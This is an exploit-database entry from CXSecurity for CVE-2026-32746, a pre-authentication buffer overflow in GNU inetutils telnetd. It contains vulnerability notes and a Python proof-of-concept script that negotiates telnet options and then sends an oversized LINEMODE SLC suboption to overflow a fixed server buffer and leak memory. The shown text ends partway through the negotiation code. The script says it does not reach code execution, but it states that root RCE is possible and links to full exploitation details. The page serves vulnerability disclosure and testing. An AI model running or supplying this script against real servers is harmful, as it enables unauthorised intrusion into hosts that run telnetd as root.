---
title: telnetd 2.7 Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2026050010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-13
fetch_date: 2026-05-14T05:45:30.135229
---

# telnetd 2.7 Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **telnetd 2.7 Buffer Overflow** **2026.05.13**  Credit:  **[Jeff Barron](https://cxsecurity.com/author/Jeff%2BBarron/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-32746](https://cxsecurity.com/cveshow/CVE-2026-32746/ "Click to see CVE-2026-32746")**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: telnetd 2.7 - Buffer Overflow
# Google Dork: N/A
# Date: 2026-04-03
# Exploit Author: Jeff Barron (jeffaf)
# Vendor Homepage: https://www.gnu.org/software/inetutils/
# Software Link: https://ftp.gnu.org/gnu/inetutils/
# Version: inetutils-telnetd through 2.7 (patch pending in next release)
# Tested on: Debian Linux (inetutils-telnetd 2.4 under xinetd, Docker lab)
# CVE: CVE-2026-32746
# CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
#
# References:
# DREAM Advisory: https://dreamgroup.com/vulnerability-advisory-pre-auth-remote-code-execution-via-buffer-overflow-in-telnetd-linemode-slc-handler/
# WatchTowr: https://labs.watchtowr.com/
# GNU Disclosure: https://lists.gnu.org/archive/html/bug-inetutils/2026-03/msg00031.html
# Fix (PR #17): https://codeberg.org/inetutils/inetutils/pulls/17
# NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-32746
#
# Notes:
# The add\_slc() function in telnetd/slc.c appends 3 bytes per SLC triplet to a
# fixed 108-byte buffer (slcbuf) with no bounds checking. Sending a crafted
# LINEMODE SLC suboption with 40+ triplets (function codes > NSLC/18) during
# initial option negotiation -- before any login prompt -- overflows slcbuf,
# corrupts the slcptr pointer, and leaks adjacent BSS data in the server
# response. telnetd runs as root via inetd/xinetd; the vendor advisory (DREAM
# Security, Advisory ID: VULN-TELNETD-SLC-2025, published 2026-03-13) confirms
# full pre-auth RCE as root is achievable. This PoC demonstrates and verifies
# the overflow via response analysis (BSS leak in server reply). It does NOT
# include shellcode or a ROP chain. Full exploitation analysis including byte
# constraints, alignment techniques, and the def\_slcbuf/free() primitive on
# 32-bit systems is covered in the WatchTowr writeup linked above.
# Docker lab: https://github.com/jeffaf/cve-2026-32746
#
# Vulnerability discovered by: Adiel Sol, Arad Inbar, Erez Cohen, Nir Somech,
# Ben Grinberg, Daniel Lubel (Dream Security Research Labs). Disclosed 2026-03-13.
# This is an independent PoC implementation.
"""
CVE-2026-32746 - telnetd LINEMODE SLC Buffer Overflow PoC
==========================================================
Triggers an out-of-bounds write in GNU InetUtils telnetd's SLC handler
by sending a crafted LINEMODE SLC suboption with excess triplets.
The overflow corrupts the slcptr pointer in BSS. When end\_slc() runs,
it writes via the corrupted pointer. The server's SLC response contains
the overflow data (leaked BSS bytes), providing direct proof.
This PoC demonstrates and verifies the overflow via response analysis.
It does NOT achieve code execution.
Usage:
python3 exploit.py <target\_ip> [port]
For authorized security testing only.
"""
import argparse
import socket
import sys
import time
# Telnet protocol bytes
IAC = 0xFF
DONT = 0xFE
DO = 0xFD
WONT = 0xFC
WILL = 0xFB
SB = 0xFA
SE = 0xF0
# Options
OPT\_ECHO = 0x01
OPT\_SGA = 0x03
OPT\_TTYPE = 0x18 # 24
OPT\_TSPEED = 0x20 # 32
OPT\_LINEMODE = 0x22 # 34
OPT\_XDISPLOC = 0x23 # 35
OPT\_OLD\_ENVIRON = 0x24 # 36
OPT\_NEW\_ENVIRON = 0x27 # 39
OPT\_NAWS = 0x1F # 31
# LINEMODE suboption codes
LM\_SLC = 0x03
# SLC constants from source
NSLC = 18 # Number of defined SLC functions
# Buffer geometry
SLCBUF\_SIZE = 108 # Total slcbuf allocation
SLCBUF\_USABLE = 104 # Usable after 4-byte header (IAC SB LINEMODE SLC)
def recv\_all(s, timeout=2):
"""Receive all available data with a timeout."""
s.settimeout(timeout)
chunks = []
try:
while True:
chunk = s.recv(4096)
if not chunk:
break
chunks.append(chunk)
except socket.timeout:
pass
return b''.join(chunks)
def negotiate\_linemode(s):
"""Complete telnet negotiation and enter LINEMODE.
Full negotiation is required: the server only processes SLC and
returns responses after all expected suboptions (TTYPE, TSPEED,
XDISPLOC, NEW\_ENVIRON, NAWS) have been received.
"""
# Round 1: Read server's initial option offers
print("[\*] Phase 1: Reading server negotiation...")
time.sleep(1)
try:
data = recv\_all(s)
except ConnectionResetError:
# Server closed connection before we could send or receive
print(f"[-] Connection reset during negotiation")
return False
if not data:
print("[-] No negotiation data received")
return False
print(f" Received {len(data)} bytes of negotiation")
# Build responses: accept everything, add WILL LINEMODE
resp = bytearray()
i = 0
while i < len(data) - 2:
if data[i] == IAC:
cmd = data[i + 1]
opt = data[i + 2]
if cmd == DO:
resp.extend([IAC, WILL, opt])
elif cmd == WILL:
resp.extend([IAC, DO, opt])
i += 3
else:
i += 1
# Proactively offer LINEMODE (triggers server's SLC handler)
resp.extend([IAC, WILL, OPT\_LINEMODE])
# Required suboption responses - server stalls without these
resp.extend([IAC, SB, OPT\_TTYPE, 0x00])
resp.extend(b'xterm')
resp.extend([IAC, SE])
resp.extend([IAC, SB, OPT\_TSPEED, 0x00])
resp.extend(b'38400,38400')
resp.extend([IAC, SE])
resp.extend([IAC, SB, OPT\_XDISPLOC, 0x00])
resp.extend(b':0')
resp.extend([IAC, SE])
resp.extend([IAC, SB, OPT\_NEW\_ENVIRON, 0x00, IAC, SE])
resp.extend([IAC, SB, OPT\_OLD\_ENVIRON, 0x00, IAC, SE])
s.send(resp)
print(f" Sent {len(resp)} bytes (negotiation + WILL LINEMODE)")
# Round 2: Server sends DO LINEMODE + additional option requests
print("[\*] Phase 2: Completing negotiation...")
time.sleep(1)
data2 = recv\_all(s, timeout=3)
if not data2:
print("[-] No response to LINEMODE offer")
return False
got\_linemode = False
resp2 = bytearray()
i = 0
while i < len(data2) - 2:
if data2[i] == IAC:
cmd = data2[i + 1]
if cmd == SB:
# Find end of suboption
j = i + 2
while j < len(data2) - 1:
if data2[j] == IAC and data2[j + 1] == SE:
break
j += 1
opt = data2[i + 2]
if opt == OPT\_TTYPE and i + 3 < len(data2) and data2[i + 3] == 0x01:
resp2.extend([IAC, SB...